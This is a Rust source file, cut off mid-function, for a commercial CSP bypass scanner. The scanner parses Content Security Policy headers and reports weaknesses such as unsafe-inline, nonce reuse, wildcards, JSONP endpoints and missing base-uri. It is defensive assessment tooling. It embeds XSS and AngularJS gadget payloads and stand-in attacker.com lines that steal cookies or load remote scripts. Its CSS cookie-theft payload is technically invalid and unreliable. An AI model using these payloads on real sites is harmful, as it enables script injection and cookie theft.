// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Content Security Policy Bypass Scanner
 *
 * Advanced CSP analysis and bypass detection including:
 * - unsafe-inline/unsafe-eval exploitation
 * - Nonce predictability and reuse
 * - Wildcard domain abuse
 * - JSONP endpoint bypasses
 * - Angular/AngularJS template injection
 * - base-uri injection
 * - Dangling markup attacks
 * - Script gadget discovery
 * - Missing directive exploitation
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */

use crate::detection_helpers::AppCharacteristics;
use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use regex::Regex;
use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use tracing::{debug, info};

/// Known JSONP endpoints that can be used for CSP bypass
const KNOWN_JSONP_ENDPOINTS: &[(&str, &str)] = &[
    // Google
    ("www.google.com", "/complete/search?client=chrome&q=test&callback="),
    ("accounts.google.com", "/o/oauth2/revoke?callback="),
    ("www.googleapis.com", "/customsearch/v1?callback="),
    ("maps.googleapis.com", "/maps/api/js?callback="),
    // CDN
    ("cdnjs.cloudflare.com", "/ajax/libs/angular.js/1.6.0/angular.min.js"),
    ("cdn.jsdelivr.net", "/npm/angular@1.6.0/angular.min.js"),
    ("unpkg.com", "/angular@1.6.0/angular.min.js"),
    // Social
    ("api.twitter.com", "/1/statuses/oembed.json?callback="),
    ("platform.twitter.com", "/widgets.js"),
    ("connect.facebook.net", "/en_US/sdk.js"),
    // Analytics
    ("www.google-analytics.com", "/analytics.js"),
    ("www.googletagmanager.com", "/gtag/js"),
    // Others
    ("api.flickr.com", "/services/feeds/photos_public.gne?jsoncallback="),
    ("en.wikipedia.org", "/w/api.php?action=query&format=json&callback="),
];

/// Known script gadgets in popular libraries
const KNOWN_SCRIPT_GADGETS: &[(&str, &str, &str)] = &[
    // Library, indicator pattern, gadget payload
    ("AngularJS 1.x", "ng-app", "{{constructor.constructor('alert(1)')()}}"),
    ("AngularJS (sandbox bypass)", "angular.min.js", "{{$on.constructor('alert(1)')()}}"),
    ("Vue.js 2.x", "Vue(", "{{_c.constructor('alert(1)')()}}"),
    ("Knockout.js", "ko.applyBindings", "data-bind=\"template: {afterRender: alert}\""),
    ("RequireJS", "require.config", "require(['data:text/javascript,alert(1)'])"),
    ("Ember.js", "Ember.Application", "{{action \"alert\" 1}}"),
    ("Lodash", "_.template", "_.template('<%= constructor.constructor(\"alert(1)\")() %>')"),
    ("jQuery", "$.parseHTML", "<img src=x onerror=alert(1)>"),
    ("DOMPurify (bypass)", "DOMPurify", "<math><mtext><option><style><mglyph>"),
    ("Google Closure", "goog.require", "goog.require('goog.string');goog.string.htmlEscape=alert"),
];

/// CSP directive types
#[derive(Debug, Clone, PartialEq)]
pub enum DirectiveType {
    DefaultSrc,
    ScriptSrc,
    StyleSrc,
    ImgSrc,
    ConnectSrc,
    FontSrc,
    ObjectSrc,
    MediaSrc,
    FrameSrc,
    FrameAncestors,
    BaseUri,
    FormAction,
    Sandbox,
    ReportUri,
    ReportTo,
    PluginTypes,
    WorkerSrc,
    ManifestSrc,
    NavigateTo,
    PrefetchSrc,
    ScriptSrcElem,
    ScriptSrcAttr,
    StyleSrcElem,
    StyleSrcAttr,
    Unknown(String),
}

impl DirectiveType {
    fn from_str(s: &str) -> Self {
        match s.to_lowercase().as_str() {
            "default-src" => DirectiveType::DefaultSrc,
            "script-src" => DirectiveType::ScriptSrc,
            "style-src" => DirectiveType::StyleSrc,
            "img-src" => DirectiveType::ImgSrc,
            "connect-src" => DirectiveType::ConnectSrc,
            "font-src" => DirectiveType::FontSrc,
            "object-src" => DirectiveType::ObjectSrc,
            "media-src" => DirectiveType::MediaSrc,
            "frame-src" => DirectiveType::FrameSrc,
            "frame-ancestors" => DirectiveType::FrameAncestors,
            "base-uri" => DirectiveType::BaseUri,
            "form-action" => DirectiveType::FormAction,
            "sandbox" => DirectiveType::Sandbox,
            "report-uri" => DirectiveType::ReportUri,
            "report-to" => DirectiveType::ReportTo,
            "plugin-types" => DirectiveType::PluginTypes,
            "worker-src" => DirectiveType::WorkerSrc,
            "manifest-src" => DirectiveType::ManifestSrc,
            "navigate-to" => DirectiveType::NavigateTo,
            "prefetch-src" => DirectiveType::PrefetchSrc,
            "script-src-elem" => DirectiveType::ScriptSrcElem,
            "script-src-attr" => DirectiveType::ScriptSrcAttr,
            "style-src-elem" => DirectiveType::StyleSrcElem,
            "style-src-attr" => DirectiveType::StyleSrcAttr,
            other => DirectiveType::Unknown(other.to_string()),
        }
    }

    fn as_str(&self) -> &str {
        match self {
            DirectiveType::DefaultSrc => "default-src",
            DirectiveType::ScriptSrc => "script-src",
            DirectiveType::StyleSrc => "style-src",
            DirectiveType::ImgSrc => "img-src",
            DirectiveType::ConnectSrc => "connect-src",
            DirectiveType::FontSrc => "font-src",
            DirectiveType::ObjectSrc => "object-src",
            DirectiveType::MediaSrc => "media-src",
            DirectiveType::FrameSrc => "frame-src",
            DirectiveType::FrameAncestors => "frame-ancestors",
            DirectiveType::BaseUri => "base-uri",
            DirectiveType::FormAction => "form-action",
            DirectiveType::Sandbox => "sandbox",
            DirectiveType::ReportUri => "report-uri",
            DirectiveType::ReportTo => "report-to",
            DirectiveType::PluginTypes => "plugin-types",
            DirectiveType::WorkerSrc => "worker-src",
            DirectiveType::ManifestSrc => "manifest-src",
            DirectiveType::NavigateTo => "navigate-to",
            DirectiveType::PrefetchSrc => "prefetch-src",
            DirectiveType::ScriptSrcElem => "script-src-elem",
            DirectiveType::ScriptSrcAttr => "script-src-attr",
            DirectiveType::StyleSrcElem => "style-src-elem",
            DirectiveType::StyleSrcAttr => "style-src-attr",
            DirectiveType::Unknown(s) => s,
        }
    }
}

/// Parsed CSP directive
#[derive(Debug, Clone)]
pub struct CspDirective {
    pub directive_type: DirectiveType,
    pub values: Vec<String>,
    pub has_unsafe_inline: bool,
    pub has_unsafe_eval: bool,
    pub has_unsafe_hashes: bool,
    pub has_strict_dynamic: bool,
    pub has_nonce: bool,
    pub has_hash: bool,
    pub has_wildcard: bool,
    pub nonces: Vec<String>,
    pub hashes: Vec<String>,
    pub domains: Vec<String>,
}

impl CspDirective {
    fn new(directive_type: DirectiveType) -> Self {
        Self {
            directive_type,
            values: Vec::new(),
            has_unsafe_inline: false,
            has_unsafe_eval: false,
            has_unsafe_hashes: false,
            has_strict_dynamic: false,
            has_nonce: false,
            has_hash: false,
            has_wildcard: false,
            nonces: Vec::new(),
            hashes: Vec::new(),
            domains: Vec::new(),
        }
    }

    fn parse_values(&mut self, values: &str) {
        for value in values.split_whitespace() {
            let v = value.trim();
            self.values.push(v.to_string());

            match v.to_lowercase().as_str() {
                "'unsafe-inline'" => self.has_unsafe_inline = true,
                "'unsafe-eval'" => self.has_unsafe_eval = true,
                "'unsafe-hashes'" => self.has_unsafe_hashes = true,
                "'strict-dynamic'" => self.has_strict_dynamic = true,
                _ if v.starts_with("'nonce-") => {
                    self.has_nonce = true;
                    if let Some(nonce) = v.strip_prefix("'nonce-").and_then(|s| s.strip_suffix("'")) {
                        self.nonces.push(nonce.to_string());
                    }
                }
                _ if v.starts_with("'sha256-") || v.starts_with("'sha384-") || v.starts_with("'sha512-") => {
                    self.has_hash = true;
                    self.hashes.push(v.to_string());
                }
                "*" => self.has_wildcard = true,
                _ if v.contains("*") => {
                    // Wildcard subdomain like *.example.com
                    self.domains.push(v.to_string());
                }
                _ if v.contains('.') || v.contains(':') => {
                    // Domain or scheme
                    self.domains.push(v.to_string());
                }
                _ => {}
            }
        }
    }
}

/// Parsed CSP policy
#[derive(Debug, Clone)]
pub struct ParsedCsp {
    pub raw: String,
    pub directives: HashMap<String, CspDirective>,
    pub is_report_only: bool,
    pub has_default_src: bool,
    pub has_script_src: bool,
    pub has_object_src: bool,
    pub has_base_uri: bool,
    pub has_form_action: bool,
}

impl ParsedCsp {
    fn new(raw: &str, is_report_only: bool) -> Self {
        Self {
            raw: raw.to_string(),
            directives: HashMap::new(),
            is_report_only,
            has_default_src: false,
            has_script_src: false,
            has_object_src: false,
            has_base_uri: false,
            has_form_action: false,
        }
    }

    fn parse(csp_header: &str, is_report_only: bool) -> Self {
        let mut parsed = Self::new(csp_header, is_report_only);

        // Split by semicolon to get directives
        for part in csp_header.split(';') {
            let part = part.trim();
            if part.is_empty() {
                continue;
            }

            // Split directive name from values
            let mut parts = part.splitn(2, ' ');
            if let Some(directive_name) = parts.next() {
                let directive_type = DirectiveType::from_str(directive_name);
                let mut directive = CspDirective::new(directive_type.clone());

                if let Some(values) = parts.next() {
                    directive.parse_values(values);
                }

                let name = directive_name.to_lowercase();
                match directive_type {
                    DirectiveType::DefaultSrc => parsed.has_default_src = true,
                    DirectiveType::ScriptSrc => parsed.has_script_src = true,
                    DirectiveType::ObjectSrc => parsed.has_object_src = true,
                    DirectiveType::BaseUri => parsed.has_base_uri = true,
                    DirectiveType::FormAction => parsed.has_form_action = true,
                    _ => {}
                }

                parsed.directives.insert(name, directive);
            }
        }

        parsed
    }

    /// Get effective script sources (script-src or default-src fallback)
    fn get_script_sources(&self) -> Option<&CspDirective> {
        self.directives.get("script-src")
            .or_else(|| self.directives.get("default-src"))
    }

    /// Get effective object sources
    fn get_object_sources(&self) -> Option<&CspDirective> {
        self.directives.get("object-src")
            .or_else(|| self.directives.get("default-src"))
    }
}

/// CSP bypass finding
#[derive(Debug, Clone)]
pub struct CspBypass {
    pub bypass_type: String,
    pub severity: Severity,
    pub description: String,
    pub poc: Option<String>,
    pub affected_directive: String,
    pub cwe: String,
    pub remediation: String,
}

/// Content Security Policy Bypass Scanner
pub struct CspBypassScanner {
    http_client: Arc<HttpClient>,
}

impl CspBypassScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Main scan entry point
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // Mandatory license check
        if !crate::license::verify_scan_authorized() {
            return Ok((Vec::new(), 0));
        }

        info!("[CSP-Bypass] Scanning: {}", url);

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Fetch the target
        let response = match self.http_client.get(url).await {
            Ok(r) => r,
            Err(e) => {
                debug!("[CSP-Bypass] Failed to fetch target: {}", e);
                return Ok((Vec::new(), 0));
            }
        };

        // Get context for intelligent scanning
        let _characteristics = AppCharacteristics::from_response(&response, url);

        // Extract CSP headers
        let csp_header = response.header("content-security-policy");
        let csp_report_only = response.header("content-security-policy-report-only");

        // Check if CSP is present
        if csp_header.is_none() && csp_report_only.is_none() {
            // No CSP - this is a different vulnerability (missing CSP)
            // handled by security_headers scanner
            info!("[CSP-Bypass] No CSP header found - skipping bypass tests");
            return Ok((Vec::new(), 0));
        }

        // Parse CSP headers
        let parsed_csps: Vec<ParsedCsp> = vec![
            csp_header.map(|h| ParsedCsp::parse(&h, false)),
            csp_report_only.map(|h| ParsedCsp::parse(&h, true)),
        ]
        .into_iter()
        .flatten()
        .collect();

        // Analyze each CSP
        for csp in &parsed_csps {
            // Report-only mode is weaker
            if csp.is_report_only {
                tests_run += 1;
                vulnerabilities.push(self.create_vulnerability(
                    url,
                    CspBypass {
                        bypass_type: "CSP Report-Only Mode".to_string(),
                        severity: Severity::Medium,
                        description: "CSP is in report-only mode and does not enforce restrictions. \
                            Malicious scripts will execute and only be reported.".to_string(),
                        poc: None,
                        affected_directive: "Content-Security-Policy-Report-Only".to_string(),
                        cwe: "CWE-1021".to_string(),
                        remediation: "Change from Content-Security-Policy-Report-Only to \
                            Content-Security-Policy header to enforce the policy.".to_string(),
                    },
                ));
            }

            // Check for unsafe-inline bypass
            let (inline_vulns, inline_tests) = self.check_unsafe_inline_bypass(url, csp);
            vulnerabilities.extend(inline_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += inline_tests;

            // Check for unsafe-eval bypass
            let (eval_vulns, eval_tests) = self.check_unsafe_eval_bypass(url, csp);
            vulnerabilities.extend(eval_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += eval_tests;

            // Check nonce/hash weaknesses
            let (nonce_vulns, nonce_tests) = self.check_nonce_hash_bypass(url, csp, &response.body).await?;
            vulnerabilities.extend(nonce_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += nonce_tests;

            // Check wildcard bypass
            let (wildcard_vulns, wildcard_tests) = self.check_wildcard_bypass(url, csp);
            vulnerabilities.extend(wildcard_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += wildcard_tests;

            // Check JSONP bypass
            let (jsonp_vulns, jsonp_tests) = self.check_jsonp_bypass(url, csp).await?;
            vulnerabilities.extend(jsonp_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += jsonp_tests;

            // Check Angular bypass
            let (angular_vulns, angular_tests) = self.check_angular_bypass(url, csp, &response.body);
            vulnerabilities.extend(angular_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += angular_tests;

            // Check base-uri bypass
            let (base_vulns, base_tests) = self.check_base_uri_bypass(url, csp);
            vulnerabilities.extend(base_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += base_tests;

            // Check form-action bypass (dangling markup)
            let (form_vulns, form_tests) = self.check_form_action_bypass(url, csp);
            vulnerabilities.extend(form_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += form_tests;

            // Check script gadgets
            let (gadget_vulns, gadget_tests) = self.check_script_gadgets(url, csp, &response.body);
            vulnerabilities.extend(gadget_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += gadget_tests;

            // Check missing directives
            let (missing_vulns, missing_tests) = self.check_missing_directives(url, csp);
            vulnerabilities.extend(missing_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += missing_tests;

            // Check object-src bypass
            let (object_vulns, object_tests) = self.check_object_src_bypass(url, csp);
            vulnerabilities.extend(object_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += object_tests;

            // Check data: URI bypass
            let (data_vulns, data_tests) = self.check_data_uri_bypass(url, csp);
            vulnerabilities.extend(data_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
            tests_run += data_tests;
        }

        info!(
            "[SUCCESS] [CSP-Bypass] Completed scan, found {} bypasses",
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Check for unsafe-inline bypass opportunities
    fn check_unsafe_inline_bypass(&self, _url: &str, csp: &ParsedCsp) -> (Vec<CspBypass>, usize) {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        if let Some(script_src) = csp.get_script_sources() {
            tests += 1;
            if script_src.has_unsafe_inline {
                let poc = if script_src.has_strict_dynamic {
                    // strict-dynamic disables unsafe-inline for parser-inserted scripts
                    None
                } else {
                    Some("<script>alert('CSP-Bypass')</script>".to_string())
                };

                if !script_src.has_strict_dynamic {
                    bypasses.push(CspBypass {
                        bypass_type: "unsafe-inline Script Execution".to_string(),
                        severity: Severity::High,
                        description: format!(
                            "CSP allows 'unsafe-inline' in script-src, enabling inline script execution. \
                            This completely bypasses XSS protection. Directive: {}",
                            script_src.values.join(" ")
                        ),
                        poc,
                        affected_directive: "script-src".to_string(),
                        cwe: "CWE-79".to_string(),
                        remediation: "Remove 'unsafe-inline' from script-src. Use nonces or hashes for \
                            legitimate inline scripts: script-src 'nonce-<random>' or script-src 'sha256-<hash>'.".to_string(),
                    });
                }
            }
        }

        // Check style-src for unsafe-inline (CSS injection)
        if let Some(style_src) = csp.directives.get("style-src") {
            tests += 1;
            if style_src.has_unsafe_inline {
                bypasses.push(CspBypass {
                    bypass_type: "unsafe-inline Style Injection".to_string(),
                    severity: Severity::Medium,
                    description: "CSP allows 'unsafe-inline' in style-src, enabling CSS injection attacks \
                        such as data exfiltration via CSS selectors.".to_string(),
                    poc: Some("<style>body { background: url('https://attacker.com/steal?data=' + document.cookie); }</style>".to_string()),
                    affected_directive: "style-src".to_string(),
                    cwe: "CWE-79".to_string(),
                    remediation: "Remove 'unsafe-inline' from style-src. Use nonces for inline styles.".to_string(),
                });
            }
        }

        (bypasses, tests)
    }

    /// Check for unsafe-eval bypass opportunities
    fn check_unsafe_eval_bypass(&self, _url: &str, csp: &ParsedCsp) -> (Vec<CspBypass>, usize) {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        if let Some(script_src) = csp.get_script_sources() {
            tests += 1;
            if script_src.has_unsafe_eval {
                bypasses.push(CspBypass {
                    bypass_type: "unsafe-eval Code Execution".to_string(),
                    severity: Severity::High,
                    description: format!(
                        "CSP allows 'unsafe-eval' in script-src, enabling eval(), Function(), \
                        setTimeout(string), and setInterval(string). Attackers can execute arbitrary \
                        JavaScript via string-to-code conversion. Directive: {}",
                        script_src.values.join(" ")
                    ),
                    poc: Some("eval('alert(document.domain)')".to_string()),
                    affected_directive: "script-src".to_string(),
                    cwe: "CWE-79".to_string(),
                    remediation: "Remove 'unsafe-eval' from script-src. Refactor code to avoid \
                        eval() and similar constructs. Use 'wasm-unsafe-eval' if only WebAssembly is needed.".to_string(),
                });
            }
        }

        (bypasses, tests)
    }

    /// Check for nonce/hash bypass opportunities
    async fn check_nonce_hash_bypass(
        &self,
        url: &str,
        csp: &ParsedCsp,
        body: &str,
    ) -> Result<(Vec<CspBypass>, usize)> {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        if let Some(script_src) = csp.get_script_sources() {
            // Check nonce predictability
            if script_src.has_nonce && !script_src.nonces.is_empty() {
                tests += 1;

                // Check if nonce is too short (weak)
                for nonce in &script_src.nonces {
                    if nonce.len() < 16 {
                        bypasses.push(CspBypass {
                            bypass_type: "Weak Nonce Length".to_string(),
                            severity: Severity::Medium,
                            description: format!(
                                "CSP nonce is too short ({} characters). Nonces should be at least \
                                128 bits (16+ base64 characters) to prevent brute-force attacks.",
                                nonce.len()
                            ),
                            poc: None,
                            affected_directive: "script-src".to_string(),
                            cwe: "CWE-330".to_string(),
                            remediation: "Use cryptographically random nonces of at least 128 bits.".to_string(),
                        });
                    }

                    // Check for predictable patterns
                    if self.is_predictable_nonce(nonce) {
                        bypasses.push(CspBypass {
                            bypass_type: "Predictable Nonce".to_string(),
                            severity: Severity::High,
                            description: format!(
                                "CSP nonce '{}' appears to follow a predictable pattern. \
                                Attackers may be able to guess future nonces.",
                                nonce
                            ),
                            poc: None,
                            affected_directive: "script-src".to_string(),
                            cwe: "CWE-330".to_string(),
                            remediation: "Generate nonces using a cryptographically secure random \
                                number generator (CSPRNG) for each request.".to_string(),
                        });
                    }
                }

                // Test nonce reuse across requests
                tests += 1;
                if let Ok(response2) = self.http_client.get(url).await {
                    if let Some(csp2) = response2.header("content-security-policy") {
                        let parsed2 = ParsedCsp::parse(&csp2, false);
                        if let Some(script_src2) = parsed2.get_script_sources() {
                            // Compare nonces
                            let nonces1: HashSet<_> = script_src.nonces.iter().collect();
                            let nonces2: HashSet<_> = script_src2.nonces.iter().collect();

                            if !nonces1.is_disjoint(&nonces2) {
                                bypasses.push(CspBypass {
                                    bypass_type: "Nonce Reuse".to_string(),
                                    severity: Severity::Critical,
                                    description: "CSP nonce is reused across requests. This allows \
                                        attackers to inject scripts using the known nonce value.".to_string(),
                                    poc: Some(format!(
                                        "<script nonce=\"{}\">alert('CSP-Bypass')</script>",
                                        script_src.nonces.first().unwrap_or(&String::new())
                                    )),
                                    affected_directive: "script-src".to_string(),
                                    cwe: "CWE-330".to_string(),
                                    remediation: "Generate a new unique nonce for every HTTP response.".to_string(),
                                });
                            }
                        }
                    }
                }

                // Check if nonce appears in HTML (can be extracted)
                tests += 1;
                for nonce in &script_src.nonces {
                    if body.contains(nonce) {
                        // Check if it's in a place where attacker could extract it
                        let nonce_pattern = format!(r#"nonce=["']?{}["']?"#, regex::escape(nonce));
                        if let Ok(re) = Regex::new(&nonce_pattern) {
                            if re.is_match(body) {
                                bypasses.push(CspBypass {
                                    bypass_type: "Nonce Extraction via Injection".to_string(),
                                    severity: Severity::High,
                                    description: "The CSP nonce is present in the page HTML. If an \
                                        attacker can inject HTML before a nonce-protected script, they \
                                        may be able to extract and reuse the nonce.".to_string(),
                                    poc: Some("<base href='https://attacker.com/'>".to_string()),
                                    affected_directive: "script-src".to_string(),
                                    cwe: "CWE-79".to_string(),
                                    remediation: "Ensure base-uri is restricted and HTML injection \
                                        points don't appear before nonce-protected scripts.".to_string(),
                                });
                            }
                        }
                    }
                }
            }

            // Check hash algorithm strength
            if script_src.has_hash {
                tests += 1;
                for hash in &script_src.hashes {
                    // sha256 is the minimum recommended
                    if hash.starts_with("'sha1-") {
                        bypasses.push(CspBypass {
                            bypass_type: "Weak Hash Algorithm (SHA-1)".to_string(),
                            severity: Severity::Low,
                            description: "CSP uses SHA-1 hash which is cryptographically weak. \
                                While not directly exploitable, sha256 or sha384 is recommended.".to_string(),
                            poc: None,
                            affected_directive: "script-src".to_string(),
                            cwe: "CWE-328".to_string(),
                            remediation: "Use sha256, sha384, or sha512 for CSP hashes.".to_string(),
                        });
                    }
                }
            }
        }

        Ok((bypasses, tests))
    }

    /// Check for wildcard domain bypass
    fn check_wildcard_bypass(&self, _url: &str, csp: &ParsedCsp) -> (Vec<CspBypass>, usize) {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        if let Some(script_src) = csp.get_script_sources() {
            tests += 1;

            // Pure wildcard
            if script_src.has_wildcard {
                bypasses.push(CspBypass {
                    bypass_type: "Wildcard Script Source".to_string(),
                    severity: Severity::Critical,
                    description: "CSP script-src contains '*', allowing scripts from any domain. \
                        This provides no protection against XSS.".to_string(),
                    poc: Some("<script src='https://attacker.com/evil.js'></script>".to_string()),
                    affected_directive: "script-src".to_string(),
                    cwe: "CWE-79".to_string(),
                    remediation: "Remove '*' and specify only trusted domains explicitly.".to_string(),
                });
            }

            // Wildcard subdomains (*.example.com)
            for domain in &script_src.domains {
                if domain.starts_with("*.") {
                    let base_domain = domain.trim_start_matches("*.");
                    bypasses.push(CspBypass {
                        bypass_type: "Wildcard Subdomain".to_string(),
                        severity: Severity::Medium,
                        description: format!(
                            "CSP allows scripts from all subdomains of {}. If any subdomain is \
                            compromised or allows user uploads, CSP can be bypassed.",
                            base_domain
                        ),
                        poc: Some(format!(
                            "<script src='https://compromised.{}/evil.js'></script>",
                            base_domain
                        )),
                        affected_directive: "script-src".to_string(),
                        cwe: "CWE-79".to_string(),
                        remediation: format!(
                            "Restrict to specific subdomains instead of *.{}",
                            base_domain
                        ),
                    });
                }
            }

            // Check for overly permissive CDN domains
            let dangerous_cdns = [
                "cdn.jsdelivr.net",
                "cdnjs.cloudflare.com",
                "unpkg.com",
                "rawgit.com",
                "raw.githubusercontent.com",
                "pastebin.com",
            ];

            for domain in &script_src.domains {
                let domain_lower = domain.to_lowercase();
                for cdn in &dangerous_cdns {
                    if domain_lower.contains(cdn) {
                        bypasses.push(CspBypass {
                            bypass_type: "Open CDN Whitelisted".to_string(),
                            severity: Severity::High,
                            description: format!(
                                "CSP whitelists {} which hosts arbitrary user content. \
                                Attackers can host malicious scripts on this CDN.",
                                cdn
                            ),
                            poc: Some(format!(
                                "<script src='https://{}/gh/user/repo/evil.js'></script>",
                                cdn
                            )),
                            affected_directive: "script-src".to_string(),
                            cwe: "CWE-79".to_string(),
                            remediation: format!(
                                "Use specific paths or hashes instead of whitelisting {}",
                                cdn
                            ),
                        });
                        break;
                    }
                }
            }
        }

        (bypasses, tests)
    }

    /// Check for JSONP endpoint bypass
    async fn check_jsonp_bypass(
        &self,
        _url: &str,
        csp: &ParsedCsp,
    ) -> Result<(Vec<CspBypass>, usize)> {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        if let Some(script_src) = csp.get_script_sources() {
            // Check each whitelisted domain for known JSONP endpoints
            for domain in &script_src.domains {
                let domain_clean = domain
                    .trim_start_matches("https://")
                    .trim_start_matches("http://")
                    .trim_start_matches("*.");

                for (jsonp_domain, jsonp_path) in KNOWN_JSONP_ENDPOINTS {
                    if domain_clean.contains(jsonp_domain) || jsonp_domain.contains(domain_clean) {
                        tests += 1;

                        // Try to verify the JSONP endpoint works
                        let jsonp_url = format!("https://{}{}alert", jsonp_domain, jsonp_path);
                        let verified = if let Ok(response) = self.http_client.get(&jsonp_url).await {
                            response.status_code == 200 && response.body.contains("alert")
                        } else {
                            false
                        };

                        bypasses.push(CspBypass {
                            bypass_type: "JSONP Endpoint Bypass".to_string(),
                            severity: if verified { Severity::High } else { Severity::Medium },
                            description: format!(
                                "CSP whitelists {} which has a JSONP endpoint at {}. \
                                This can be used to execute arbitrary JavaScript via callback parameter.",
                                jsonp_domain, jsonp_path
                            ),
                            poc: Some(format!(
                                "<script src='https://{}{}alert'></script>",
                                jsonp_domain, jsonp_path
                            )),
                            affected_directive: "script-src".to_string(),
                            cwe: "CWE-79".to_string(),
                            remediation: format!(
                                "Remove {} from script-src or use specific paths. \
                                Consider using 'strict-dynamic' with nonces.",
                                jsonp_domain
                            ),
                        });
                    }
                }
            }

            // Check Google APIs which are commonly whitelisted and have many JSONP endpoints
            for domain in &script_src.domains {
                if domain.contains("googleapis.com") || domain.contains("google.com") {
                    tests += 1;
                    bypasses.push(CspBypass {
                        bypass_type: "Google JSONP Bypass Potential".to_string(),
                        severity: Severity::Medium,
                        description: format!(
                            "CSP whitelists {}. Google services have numerous JSONP endpoints \
                            that can be abused for CSP bypass.",
                            domain
                        ),
                        poc: Some("<script src='https://www.google.com/complete/search?client=chrome&q=test&callback=alert'></script>".to_string()),
                        affected_directive: "script-src".to_string(),
                        cwe: "CWE-79".to_string(),
                        remediation: "Use specific Google API endpoints or implement strict-dynamic.".to_string(),
                    });
                    break;
                }
            }
        }

        Ok((bypasses, tests))
    }

    /// Check for Angular/AngularJS template injection bypass
    fn check_angular_bypass(
        &self,
        _url: &str,
        csp: &ParsedCsp,
        body: &str,
    ) -> (Vec<CspBypass>, usize) {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        // Check if Angular is loaded
        let has_angular = body.contains("ng-app") ||
            body.contains("ng-version") ||
            body.to_lowercase().contains("angular");

        if !has_angular {
            return (bypasses, 0);
        }

        tests += 1;

        if let Some(script_src) = csp.get_script_sources() {
            // Check if Angular CDN is whitelisted
            let angular_sources = [
                "angular.io",
                "angularjs.org",
                "ajax.googleapis.com",
                "cdnjs.cloudflare.com",
                "cdn.jsdelivr.net",
            ];

            for domain in &script_src.domains {
                for angular_src in &angular_sources {
                    if domain.contains(angular_src) {
                        tests += 1;

                        // Determine Angular version from body
                        let is_angular_1 = body.contains("ng-app") ||
                            body.contains("angular.min.js") ||
                            body.contains("angular.js");

                        let poc = if is_angular_1 {
                            // AngularJS 1.x sandbox bypass
                            "{{constructor.constructor('alert(1)')()}}"
                        } else {
                            // Angular 2+ (less exploitable but still check)
                            "{{constructor.constructor('alert(1)')()}}"
                        };

                        bypasses.push(CspBypass {
                            bypass_type: "AngularJS Template Injection".to_string(),
                            severity: Severity::High,
                            description: format!(
                                "Page uses Angular and CSP whitelists {}. AngularJS template \
                                expressions can be used to bypass CSP and execute JavaScript.",
                                angular_src
                            ),
                            poc: Some(poc.to_string()),
                            affected_directive: "script-src".to_string(),
                            cwe: "CWE-79".to_string(),
                            remediation: "Upgrade to Angular 2+ which is more resistant to template \
                                injection. Sanitize all user input. Consider removing ng-app from user-controllable elements.".to_string(),
                        });
                        break;
                    }
                }
            }
        }

        // Check for ng-app in potentially injectable locations
        if body.contains("ng-app") {
            tests += 1;
            bypasses.push(CspBypass {
                bypass_type: "Angular ng-app Present".to_string(),
                severity: Severity::Medium,
                description: "Page has ng-app directive. If Angular is loaded and attacker can \
                    inject into the DOM, template expressions will be evaluated.".to_string(),
                poc: Some("<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>".to_string()),
                affected_directive: "script-src".to_string(),
                cwe: "CWE-79".to_string(),
                remediation: "Ensure user input cannot create new ng-app contexts. \
                    Use strict contextual output encoding.".to_string(),
            });
        }

        (bypasses, tests)
    }

    /// Check for base-uri bypass
    fn check_base_uri_bypass(&self, _url: &str, csp: &ParsedCsp) -> (Vec<CspBypass>, usize) {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        tests += 1;
        if !csp.has_base_uri {
            bypasses.push(CspBypass {
                bypass_type: "Missing base-uri Directive".to_string(),
                severity: Severity::Medium,
                description: "CSP does not include base-uri directive. Attackers can inject \
                    <base> tags to hijack relative URLs, potentially stealing credentials or \
                    loading malicious scripts.".to_string(),
                poc: Some("<base href='https://attacker.com/'>".to_string()),
                affected_directive: "base-uri".to_string(),
                cwe: "CWE-79".to_string(),
                remediation: "Add base-uri 'self' or base-uri 'none' to the CSP.".to_string(),
            });
        } else if let Some(base_uri) = csp.directives.get("base-uri") {
            if base_uri.has_wildcard {
                bypasses.push(CspBypass {
                    bypass_type: "Permissive base-uri".to_string(),
                    severity: Severity::Medium,
                    description: "CSP base-uri allows any origin, enabling <base> tag injection.".to_string(),
                    poc: Some("<base href='https://attacker.com/'>".to_string()),
                    affected_directive: "base-uri".to_string(),
                    cwe: "CWE-79".to_string(),
                    remediation: "Set base-uri to 'self' or 'none'.".to_string(),
                });
            }
        }

        (bypasses, tests)
    }

    /// Check for form-action bypass (dangling markup / data exfiltration)
    fn check_form_action_bypass(&self, _url: &str, csp: &ParsedCsp) -> (Vec<CspBypass>, usize) {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        tests += 1;
        if !csp.has_form_action {
            bypasses.push(CspBypass {
                bypass_type: "Missing form-action Directive".to_string(),
                severity: Severity::Medium,
                description: "CSP does not include form-action directive. Attackers can use \
                    dangling markup injection to exfiltrate data via form submission to external domains.".to_string(),
